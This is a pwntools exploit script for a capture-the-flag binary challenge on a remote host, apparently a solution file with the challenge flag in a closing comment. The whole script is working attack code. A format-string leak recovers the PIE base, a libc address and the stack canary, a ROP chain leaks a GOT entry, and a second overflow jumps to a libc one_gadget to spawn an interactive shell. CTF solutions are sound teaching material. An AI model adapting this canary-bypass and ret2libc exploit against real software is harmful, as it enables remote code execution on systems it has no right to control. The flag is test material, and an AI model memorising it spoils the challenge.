
from pwn import *

# r = process('./chall')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r = remote('chall.nitdgplug.org', 30091)
libc =ELF('./libc.so.6')

libc_main = libc.sym['__libc_start_main']
r.readline()
r.sendline(b'%20$p %9$p %23$p')
base, leak, canary = r.readline().split()

leak = int(leak, 16) - 0x1cf6c0
canary = int(canary, 16)
base = int(base, 16) - 0x12e0

pop_rdi = 0x0000000000001343 #: pop rdi; ret; 

p = cyclic(72, n=8)
p += p64(canary)
p += b'AAAAAAAA'
p += p64(base+pop_rdi)
p += p64(base+0x3FE0)
p += p64(base+0x10B4)
p += p64(base+0x1209)

r.sendline(p)
r.recv()
leak = int.from_bytes(r.recv().split()[0], byteorder='little')

r.sendline(b'AAAA')
r.readline()

leak = leak-libc_main

p = cyclic(72, n=8)
p += p64(canary)
p += b'AAAAAAAA'
p += p64(leak+0xe3b31)

r.sendline(p)

r.interactive()

# GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}

